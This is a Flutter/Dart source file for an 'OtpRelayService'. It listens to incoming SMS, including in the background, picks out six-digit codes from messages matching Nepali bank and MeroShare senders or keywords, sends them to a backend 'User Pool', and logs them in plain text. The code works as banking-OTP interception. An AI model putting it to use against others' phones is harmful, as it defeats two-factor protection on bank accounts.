import 'package:telephony/telephony.dart';
import 'api_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';

class OtpRelayService {
  final Telephony telephony = Telephony.instance;
  final ApiService _apiService = ApiService();

  static final OtpRelayService _instance = OtpRelayService._internal();

  factory OtpRelayService() {
    return _instance;
  }

  OtpRelayService._internal();

  void initialize() async {
    print("Initializing OtpRelayService...");
    bool? permissionsGranted = await telephony.requestSmsPermissions;
    if (permissionsGranted != null && permissionsGranted) {
      print("SMS Permissions GRANTED. Listening for messages...");
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          _handleIncomingSms(message);
        },
        onBackgroundMessage: _backgroundMessageHandler,
      );
    } else {
      print("SMS Permissions DENIED. OTP relay will not function.");
    }
  }

  void _handleIncomingSms(SmsMessage message) async {
    final body = message.body ?? "";
    final address = message.address ?? "";
    print("Incoming SMS from $address: $body");

    // Match 6 digit OTP (Broaden to match any 6 digits if it looks like a code)
    final otpMatch = RegExp(r'\b\d{6}\b').firstMatch(body);
    
    // Check keywords in body OR sender address (Loosened significantly)
    bool isBankingSms = body.contains(RegExp(r'OTP|code|verification|passcode|Pin|Transaction|auth|Confirm|Verify|Applied|MeroShare|CASBA', caseSensitive: false)) ||
                        address.contains(RegExp(r'NIC|Nabil|NMB|PRABHU|Siddhartha|Global|Sanima|Kumari|Citizens|Laxmi|Sunrise|Agriculture|AD-|Nepal|MeShare|620|320', caseSensitive: false));
    
    if (otpMatch != null && isBankingSms) {
      final otp = otpMatch.group(0)!;
      print("OTP Detected: $otp. Attempting relay...");
      await _relayOtpToBackend(otp, address);
    } else if (otpMatch != null) {
      _logRelayEvent(address, "6-digit found but rejected by filters.");
    }
  }

  Future<void> _relayOtpToBackend(String otp, String address) async {
    try {
      await _apiService.relayOtp(null, otp);
      _logRelayEvent(address, "SUCCESS: Relayed $otp to User Pool");
    } catch (e) {
      _logRelayEvent(address, "ERROR: $e");
    }
  }

  void _logRelayEvent(String address, String status) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      List<String> logs = prefs.getStringList('relay_debug_logs') ?? [];
      final now = DateTime.now().toString().split(' ')[1].split('.')[0];
      logs.insert(0, "[$now] $address: $status");
      if (logs.length > 10) logs = logs.sublist(0, 10);
      await prefs.setStringList('relay_debug_logs', logs);
    } catch (e) {}
  }
}

// Background handler must be top-level
@pragma('vm:entry-point')
void _backgroundMessageHandler(SmsMessage message) async {
  WidgetsFlutterBinding.ensureInitialized();
  
  final body = message.body ?? "";
  final address = message.address ?? "Unknown";
  
  _staticLogRelayEvent(address, "BG_WAKE: Received SMS");

  final otpMatch = RegExp(r'\b\d{6}\b').firstMatch(body);
  bool isBankingSms = body.contains(RegExp(r'OTP|code|verification|passcode|Pin|Transaction|auth|Confirm|Verify|Applied|MeroShare|CASBA', caseSensitive: false)) ||
                      address.contains(RegExp(r'NIC|Nabil|NMB|PRABHU|Siddhartha|Global|Sanima|Kumari|Citizens|Laxmi|Sunrise|Agriculture|AD-|Nepal|MeShare|620|320', caseSensitive: false));

  if (otpMatch != null && isBankingSms) {
    final otp = otpMatch.group(0)!;
    _staticLogRelayEvent(address, "BG_MATCH: OTP Detected [$otp]");
    
    // Give the network stack a second to wake up
    await Future.delayed(Duration(seconds: 1));
    
    final apiService = ApiService();
    try {
      final token = await apiService.getToken();
      if (token == null) {
        _staticLogRelayEvent(address, "BG_FAIL: No Token found in Isolate");
        return;
      }
      _staticLogRelayEvent(address, "BG_API_START: Relaying...");
      await apiService.relayOtp(null, otp);
      _staticLogRelayEvent(address, "BG_SUCCESS: Relayed $otp");
    } catch (e) {
      _staticLogRelayEvent(address, "BG_API_ERROR: ${e.toString()}");
    }
  } else if (otpMatch != null) {
     _staticLogRelayEvent(address, "BG_FILTER_ONLY: 6-digit found but filter mismatch.");
  } else {
     _staticLogRelayEvent(address, "BG_IGNORE: No OTP pattern.");
  }
}

Future<void> _showDebugNotification(String title, String body) async {
  try {
    final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
    const AndroidInitializationSettings initializationSettingsAndroid = AndroidInitializationSettings('@mipmap/ic_launcher');
    const InitializationSettings initializationSettings = InitializationSettings(android: initializationSettingsAndroid);
    await flutterLocalNotificationsPlugin.initialize(initializationSettings);

    const AndroidNotificationDetails androidPlatformChannelSpecifics = AndroidNotificationDetails(
      'otp_relay_debug',
      'OTP Relay Debug',
      importance: Importance.max,
      priority: Priority.high,
      showWhen: true,
    );
    const NotificationDetails platformChannelSpecifics = NotificationDetails(android: androidPlatformChannelSpecifics);
    await flutterLocalNotificationsPlugin.show(
      DateTime.now().millisecond,
      title,
      body,
      platformChannelSpecifics,
    );
  } catch (e) {
    print("Failed to show BG notification: $e");
  }
}

void _staticLogRelayEvent(String address, String status) async {
  try {
    final prefs = await SharedPreferences.getInstance();
    List<String> logs = prefs.getStringList('relay_debug_logs') ?? [];
    final now = DateTime.now().toString().split(' ')[1].split('.')[0];
    logs.insert(0, "[$now] $address: $status");
    if (logs.length > 20) logs = logs.sublist(0, 20); // More logs for debug
    await prefs.setStringList('relay_debug_logs', logs);
  } catch (e) {}
}
